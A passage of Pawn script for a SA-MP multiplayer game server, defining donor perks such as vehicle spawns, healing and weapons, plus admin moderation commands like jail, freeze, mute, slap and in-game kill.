				new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
                new Float:x, Float:y, Float:z;
                GetPlayerPos(playerid, x, y, z);
				SendClientMessage(playerid,blue,"Support Armour Package.");
				Block_CMD[playerid][17] = true;
				SetTimerEx("EnableDHeal",300000,false,"dd",playerid,17);
				foreach(Player, i)
				{
                	if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,5.0, x, y, z) ) SetPlayerArmour(i,100);
               	}
            	return 1;
			}
			else return SendClientMessage(playerid,red,"JikyBot: You need to wait (5) minutes.");
		}
	  	else return SendClientMessage(playerid,red,"JikyBot: You Need To Be Support Class.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}
CMD:dcar(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][dRank] >= 1)
		{
			if(Block_CMD[playerid][5] == false)
			{
				CarSpawner(playerid,411);
				SendClientMessage(playerid,blue,"Car Spawned.");
				Block_CMD[playerid][5] = true;
				SendCMDMessge(playerid,"DCAR");
				SetTimerEx("EnableCMD",300000,false,"dd",playerid,5); // gogo
			}
		else return SendClientMessage(playerid,red,"JikyBot: You have to wait 5 minutes!");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 1 To Use This Command");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:dheli(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][dRank] >= 2)
		{
			if(Block_CMD[playerid][15] == false)
			{
				CarSpawner(playerid,487);
				SendClientMessage(playerid,blue,"Heli Spawned.");
				Block_CMD[playerid][15] = true;
				SendCMDMessge(playerid,"DHELI");
				SetTimerEx("EnableCMD",300000,false,"dd",playerid,15); // gogo
			}
		else return SendClientMessage(playerid,red,"JikyBot: You have to wait 5 minutes!");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 1 To Use This Command");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:dskin(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/dskin [skinid]");
		new var = strval(params);
		if(!IsValidSkin(var)) return SendClientMessage(playerid, red, "JikyBot: Invaild Skin ID");
		SetPlayerSkin(playerid,var);
		SendCMDMessge(playerid,"DSKIN");
       	if(var == 217) return SendClientMessage(playerid, red, "JikyBot: You Can't Use Admin Skin, Change it!");
	  } else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 2 To Use This Command");
   } else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
   return 1;
}

CMD:fr(playerid)
{
 if(PlayerInfo[playerid][dRank] >= 2)
 {
  if(Block_CMD[playerid][12] == false)
  {
   Block_CMD[playerid][12] = true;
   SetTimerEx("EnableCMD",60000,false,"dd",playerid,12);
   new Float:x, Float:y, Float:z;
   GetPlayerPos(playerid, x, y, z);
   foreach(Player, i)
   {
    if(i != playerid && IsPlayerInAnyVehicle(i)) SendClientMessage(playerid,grey,"Set enemy in range vehicle vehicle on fire.");
    {
     if(gTeam[playerid] != gTeam[i])
     {
      if(IsPlayerInRangeOfPoint(i,15.0, x+6, y+6, z+6) )
      {
       SetVehicleHealth(GetPlayerVehicleID(i), 0.0);
      }
     }
    }
   }
  }
  else return SendClientMessage(playerid,red,"JikyBot: You need to wait (1) minute.");
 }
 else return SendClientMessage(playerid,red,"JikyBot: You need to be donor rank 2 to use this command.");
 return 1;
}

CMD:dheal(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][dRank] >= 1)
		{
			if(Block_CMD[playerid][1] == false)
			{
				SetPlayerHealth(playerid,100);
				SendClientMessage(playerid,yellow,"Health Restored!");
				Block_CMD[playerid][1] = true;
				SendCMDMessge(playerid,"DHEAL");
				SetTimerEx("EnableCMD",120000,false,"dd",playerid,1); // gogo
			}
		else return SendClientMessage(playerid,red,"JikyBot: You have to wait 2 minutes!");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 1 To Use This Command");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}

CMD:dreport(playerid,params[]) {
{
   if(PlayerInfo[playerid][dRank] >= 1)
    	{
    new reported, tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/dreport [playerid] [reason]");
	reported = strval(tmp);

 	if(IsPlayerConnected(reported) && reported != INVALID_PLAYER_ID) {
		if(PlayerInfo[reported][Level] == ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot report this administrator");
		if(playerid == reported) return SendClientMessage(playerid,red,"JikyBot: You Cannot report yourself");
		if(strlen(params) > 3) {
			new reportedname[MAX_PLAYER_NAME], reporter[MAX_PLAYER_NAME], str[128], hour,minute,second; gettime(hour,minute,second);
			GetPlayerName(reported, reportedname, sizeof(reportedname));	GetPlayerName(playerid, reporter, sizeof(reporter));
			format(str, sizeof(str), ""cgreen"||NewReport||  "cred"%s(%d) "cgreen"reported "cred"%s(%d) "cgreen"Reason: %s "cred"|@%d:%d:%d|", reporter,playerid, reportedname, reported, params[strlen(tmp)+1], hour,minute,second);
			MessageToTwice(red,str);
			SaveToFile("ReportLog",str);
			format(str, sizeof(str), "Report(%d:%d:%d): %s(%d) reported %s(%d) Reason: %s", hour,minute,second, reporter,playerid, reportedname, reported, params[strlen(tmp)+1]);
			for(new i = 1; i < MAX_REPORTS-1; i++) Reports[i] = Reports[i+1];
			Reports[MAX_REPORTS-1] = str;
			return SendClientMessage(playerid,yellow, "Your report has been sent to online administrators.");
		} else return SendClientMessage(playerid,red,"JikyBot: Must be a valid reason");
	} else return SendClientMessage(playerid, red, "Player is not connected");
			}
	else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 1 To Use This Command");
}
}

CMD:dammo(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][dRank] >= 1)
		{
			if(Block_CMD[playerid][7] == false)
			{
               if(GetPlayerMoney(playerid) < 5000) return SendClientMessage(playerid,red,"JikyBot: You Need $5000!");
				GiveAmmo(playerid);
				SendClientMessage(playerid,yellow,"Ammo Restored!");
                Block_CMD[playerid][7] = true;
                SendCMDMessge(playerid,"DAMMO");
				SetTimerEx("EnableCMD",120000,false,"dd",playerid,7);
			}
		else return SendClientMessage(playerid,red,"JikyBot: You have to wait 2 minutes!");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 1 To Use This Command");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:jp(playerid,params[]) // can i show u something? somwthing what?
{
 if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(gClass[playerid] == JET)
		{
			if(Block_CMD[playerid][9] == false)
			{
				SetPlayerSpecialAction(playerid, 2);
				SendClientMessage(playerid,blue,"JetPack Spawned.");
                Block_CMD[playerid][9] = true;
				SetTimerEx("EnableCMD",120000,false,"dd",playerid,9); // gogo
			}
		else return SendClientMessage(playerid,red,"JikyBot: You have to wait 2 minutes!");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You need to be JetTrooper Class.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:dboost(playerid,params[]) // can i show u something? somwthing what?
{
 if(PlayerInfo[playerid][LoggedIn] == 1)
 {
  if(PlayerInfo[playerid][dRank] >= 3 || gClass[playerid] == DONOR)
  {
   if(Block_CMD[playerid][10] == false)
   {
   new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
   new Float:x, Float:y, Float:z;
   GetPlayerPos(playerid, x, y, z);
   SendClientMessage(playerid,blue,"Donor Boost.");
   Block_CMD[playerid][10] = true;
   SendCMDMessge(playerid,"DBOOST");
   SetTimerEx("EnableCMD",300000,false,"dd",playerid,10);
   foreach(Player, i)
   {
    if(IsPlayerInRangeOfPoint(i,5.0, x, y, z))
    {
     GivePlayerWeapon(i,35,1);
    }
   }
  }
  else return SendClientMessage(playerid,red,"JikyBot: You have to wait 5 minutes!");
  }
  else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 3 To Use This Command");
 }
 else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
return 1;
}

CMD:dweaps(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][dRank] >= 2)
		{
			if(Block_CMD[playerid][11] == false)
			{
				GivePlayerWeapon(playerid, 26,500);
				GivePlayerWeapon(playerid, 24,500);
				GivePlayerWeapon(playerid, 32,500);
				GivePlayerWeapon(playerid, 35,1);
				GivePlayerWeapon(playerid, 16,2);
				SendClientMessage(playerid,blue,"Donor Weapons.");
				Block_CMD[playerid][11] = true;
				SendCMDMessge(playerid,"DWEAPS");
				SetTimerEx("EnableCMD",300000,false,"dd",playerid,11); // gogo
			}
		else return SendClientMessage(playerid,red,"JikyBot: You have to wait 5 minutes!");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 2 To Use This Command");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:dcc(playerid, params[])
{
        if(PlayerInfo[playerid][dRank] >= 1) {
        new
			col[2];
        if(sscanf(params, "ii",col[0],col[1])) return SCM(playerid, red, "JikyBot: Usage:/dcc (Col-1) (Col-2)");
        SendCMDMessge(playerid,"DCC");
        ChangeVehicleColor(GetPlayerVehicleID(playerid), col[0],col[1]);
        SCM(playerid,blue ,"Vehicle Color changed.");
		} else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 1 To Use This Command");
return 1;
}
CMD:dnos(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] >= 1) {
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,"JikyBot: You Need be In Vehicle!");
		if(GetPlayerMoney(playerid) < 9000) return SendClientMessage(playerid,red,"JikyBot: You Need $9000!");
		AddVehicleComponent(GetPlayerVehicleID(playerid), 1010); // Nitro
		GivePlayerMoney(playerid,-9000);
		SendCMDMessge(playerid,"DNOS");
	  } else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 1 To Use This Command");
   } else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
   return 1;
}
CMD:dcmds(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] == 0) return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 1 To Use This Command");
		if(PlayerInfo[playerid][dRank] == 1)
		{
		  SendClientMessage(playerid,blue,"----== Donor Rank 1 Commands ==----");
		  SendClientMessage(playerid,lightblue,"dheal, dcar ,dnos, dammo, dcc");
		  SendClientMessage(playerid,lightblue,"dreport /v for V.I.P Chat");
		}
		else if(PlayerInfo[playerid][dRank] == 2)
		{
		  SendClientMessage(playerid,blue,"----== Donor Rank 2 Commands ==----");
		  SendClientMessage(playerid,lightblue,"dheal, dcar,dbike,dweaps, dskin,dcc, dprestige");
		  SendClientMessage(playerid,lightblue,"dnos, dammo, dtime, dreport, dweather");
		}
		else if(PlayerInfo[playerid][dRank] == 3)
		{
		  SendClientMessage(playerid,blue,"----== Donor Rank 3 Commands ==----");
		  SendClientMessage(playerid,lightblue,"dheal,dbike,dskin,dcc,dnos, dtime");
		  SendClientMessage(playerid,lightblue,"dboost,dweaps,dnos,dcar, dammo, fr");
		  SendClientMessage(playerid,lightblue,"dreport, dweather");
		}
   } else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
   return 1;
}
CMD:setdonor(playerid,params[]) {
if(PlayerInfo[playerid][Level] >= 9) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric5(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setdonor [playerid] [Level] | Note : Max Levels = 5 |");
		new player1 = strval(tmp), skin = strval(tmp2), string[128];
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETDONOR");
			format(string, sizeof(string), "You have set \"%s's\" DRank Level to '%d", pName(player1), skin); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your DRank Level to '%d'", pName(playerid), skin); SendClientMessage(player1,blue,string); }
			SaveToFile("AdminLog",string);
   			return PlayerInfo[player1][dRank] = skin;
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:slap(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/slap [playerid] [reason/with]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				CMDMessageToAdmins(playerid,"SLAP");
		        new Float:Health, Float:x, Float:y, Float:z; GetPlayerHealth(player1,Health);
				GetPlayerPos(player1,x,y,z); SetPlayerPos(player1,x,y,z+6); PlayerPlaySound(playerid,1190,0.0,0.0,0.0); PlayerPlaySound(player1,1190,0.0,0.0,0.0);

				if(strlen(tmp2)) {
					format(string,sizeof(string),"You have slapped %s %s ",playername,params[2]); return SendClientMessage(playerid,blue,string);
				} else {
					format(string,sizeof(string),"You have slapped %s",playername); return SendClientMessage(playerid,blue,string); }
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}


CMD:explode(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/explode [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); 	GetPlayerName(playerid, adminname, sizeof(adminname));
				CMDMessageToAdmins(playerid,"EXPLODE");
				new Float:burnx, Float:burny, Float:burnz; GetPlayerPos(player1,burnx, burny, burnz); CreateExplosion(burnx, burny , burnz, 7,10.0);

				if(strlen(tmp2)) {
					format(string,sizeof(string),"You have exploded %s [reason: %s]", playername,params[2]); return SendClientMessage(playerid,blue,string);
				} else {
					format(string,sizeof(string),"You have exploded %s", playername); return SendClientMessage(playerid,blue,string); }
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:jail(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 1) {
		    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/jail [playerid] [minutes] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				if(PlayerInfo[player1][Jailed] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
					new jtime = strval(tmp2);
					if(jtime == 0) jtime = 9999;

			       	CMDMessageToAdmins(playerid,"JAIL");
					PlayerInfo[player1][JailTime] = jtime*1000*60;
    			    JailPlayer(player1);
    			    Jail1(player1);
		        	PlayerInfo[player1][Jailed] = 1;

					if(jtime == 9999) {
						if(!strlen(params[strlen(tmp2)+1])) format(string,sizeof(string),"Administrator %s has jailed %s ",adminname, playername);
						else format(string,sizeof(string),"Administrator %s has jailed %s [reason: %s]",adminname, playername, params[strlen(tmp)+1] );
   					} else {
						if(!strlen(tmp3)) format(string,sizeof(string),"Administrator %s has jailed %s for %d minutes",adminname, playername, jtime);
						else format(string,sizeof(string),"Administrator %s has jailed %s for %d minutes [reason: %s]",adminname, playername, jtime, params[strlen(tmp2)+strlen(tmp)+1] );
					}
	    			return SendClientMessageToAll(blue,string);
				} else return SendClientMessage(playerid, red, "Player is already in jail");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:unjail(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 1) {
		    new tmp[256], Index; tmp = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/jail [playerid]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				if(PlayerInfo[player1][Jailed] == 1) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
					format(string,sizeof(string),"Administrator %s has unjailed you",adminname);	SendClientMessage(player1,blue,string);
					format(string,sizeof(string),"Administrator %s has unjailed %s",adminname, playername);
					JailRelease(player1);
					return SendClientMessageToAll(blue,string);
				} else return SendClientMessage(playerid, red, "Player is not in jail");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:jailed(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
	 		new bool:First2 = false, cout, adminname[MAX_PLAYER_NAME], string[128], i;
		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Jailed]) cout++;
			if(cout == 0) return SendClientMessage(playerid,red, "No players are jailed");

		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Jailed]) {
	    		GetPlayerName(i, adminname, sizeof(adminname));
				if(!First2) { format(string, sizeof(string), "Jailed Players: (%d)%s", i,adminname); First2 = true; }
		        else format(string,sizeof(string),"%s, (%d)%s ",string,i,adminname);
	        }
		    return SendClientMessage(playerid,COLOR_WHITE,string);
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:freeze(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 3) {
		    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/freeze [playerid] [minutes] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(PlayerInfo[player1][Frozen] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
					new ftime = strval(tmp2);
					if(ftime == 0) ftime = 9999;

			       	CMDMessageToAdmins(playerid,"FREEZE");
					TogglePlayerControllable(player1,false); PlayerInfo[player1][Frozen] = 1; PlayerPlaySound(player1,1057,0.0,0.0,0.0);
					PlayerInfo[player1][FreezeTime] = ftime*1000*60;
			        FreezeTimer[player1] = SetTimerEx("UnFreezeMe",PlayerInfo[player1][FreezeTime],0,"d",player1);

					if(ftime == 9999) {
						if(!strlen(params[strlen(tmp2)+1])) format(string,sizeof(string),"Administrator %s has frozen %s ",adminname, playername);
						else format(string,sizeof(string),"Administrator %s has frozen %s [reason: %s]",adminname, playername, params[strlen(tmp)+1] );
	   				} else {
						if(!strlen(tmp3)) format(string,sizeof(string),"Administrator %s has frozen %s for %d minutes",adminname, playername, ftime);
						else format(string,sizeof(string),"Administrator %s has frozen %s for %d minutes [reason: %s]",adminname, playername, ftime, params[strlen(tmp2)+strlen(tmp)+1] );
					}
		    		return SendClientMessageToAll(blue,string);
				} else return SendClientMessage(playerid, red, "Player is already frozen");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:unfreeze(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 3|| IsPlayerAdmin(playerid)) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/unfreeze [playerid]");
	    	new player1, string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		 	    if(PlayerInfo[player1][Frozen] == 1) {
			       	CMDMessageToAdmins(playerid,"UNFREEZE");
					UnFreezeMe(player1);
					format(string,sizeof(string),"Administrator %s has unfrozen you", PlayerName2(playerid) ); SendClientMessage(player1,blue,string);
					format(string,sizeof(string),"Administrator %s has unfrozen %s", PlayerName2(playerid), PlayerName2(player1));
		    		return SendClientMessageToAll(blue,string);
				} else return SendClientMessage(playerid, red, "Player is not frozen");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:frozen(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
	 		new bool:First2 = false, cot, adminname[MAX_PLAYER_NAME], string[128];
		    foreach(Player, i) { if(IsPlayerConnected(i) && PlayerInfo[i][Frozen]) cot++;
			if(cot == 0) return SendClientMessage(playerid,red, "No players are frozen"); }

		    foreach(Player, i) { if(IsPlayerConnected(i) && PlayerInfo[i][Frozen]) {
	    		GetPlayerName(i, adminname, sizeof(adminname));
				if(!First2) { format(string, sizeof(string), "Frozen Players: (%d)%s", i,adminname); First2 = true; }
		        else format(string,sizeof(string),"%s, (%d)%s ",string,i,adminname); }
	        }
		    return SendClientMessage(playerid,COLOR_WHITE,string);
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:mute(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/mute [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Muted] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); 	GetPlayerName(playerid, adminname, sizeof(adminname));
					CMDMessageToAdmins(playerid,"MUTE");
					PlayerPlaySound(player1,1057,0.0,0.0,0.0);  PlayerInfo[player1][Muted] = 1; PlayerInfo[player1][MuteWarnings] = 0;

					if(strlen(tmp2)) {
						format(string,sizeof(string),"You have been muted by Administrator %s [reason: %s]",adminname,params[2]); SendClientMessage(player1,blue,string);
						format(string,sizeof(string),"You have muted %s [reason: %s]", playername,params[2]); return SendClientMessage(playerid,blue,string);
					} else {
						format(string,sizeof(string),"You have been muted by Administrator %s",adminname); SendClientMessage(player1,blue,string);
						format(string,sizeof(string),"You have muted %s", playername); return SendClientMessage(playerid,blue,string); }
				} else return SendClientMessage(playerid, red, "Player is already muted");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:unmute(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/unmute [playerid]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Muted] == 1) {
					GetPlayerName(player1, playername, sizeof(playername)); 	GetPlayerName(playerid, adminname, sizeof(adminname));
					CMDMessageToAdmins(playerid,"UNMUTE");
					PlayerPlaySound(player1,1057,0.0,0.0,0.0);  PlayerInfo[player1][Muted] = 0; PlayerInfo[player1][MuteWarnings] = 0;
					format(string,sizeof(string),"You have been unmuted by Administrator %s",adminname); SendClientMessage(player1,blue,string);
					format(string,sizeof(string),"You have unmuted %s", playername); return SendClientMessage(playerid,blue,string);
				} else return SendClientMessage(playerid, red, "Player is not muted");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:muted(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
	 		new bool:First2 = false, cart, adminname[MAX_PLAYER_NAME], string[128], i;
		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Muted]) cart++;
			if(cart == 0) return SendClientMessage(playerid,red, "No players are muted");

		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Muted]) {
	    		GetPlayerName(i, adminname, sizeof(adminname));
				if(!First2) { format(string, sizeof(string), "Muted Players: (%d)%s", i,adminname); First2 = true; }
		        else format(string,sizeof(string),"%s, (%d)%s ",string,i,adminname);
	        }
		    return SendClientMessage(playerid,COLOR_WHITE,string);
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:akill(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 3|| IsPlayerAdmin(playerid)) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/akill [playerid]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if( (PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel] ) )
					return SendClientMessage(playerid, red, "You cannot akill the highest level admin");
				CMDMessageToAdmins(playerid,"AKILL");
				GetPlayerName(player1, playername, sizeof(playername));	GetPlayerName(playerid, adminname, sizeof(adminname));
				format(string,sizeof(string),"Administrator %s has killed you",adminname);	SendClientMessage(player1,blue,string);
				format(string,sizeof(string),"You have killed %s",playername); SendClientMessage(playerid,blue,string);
				return SetPlayerHealth(player1,0.0);
			} else return SendClientMessage(playerid, red, "Player is not connected");
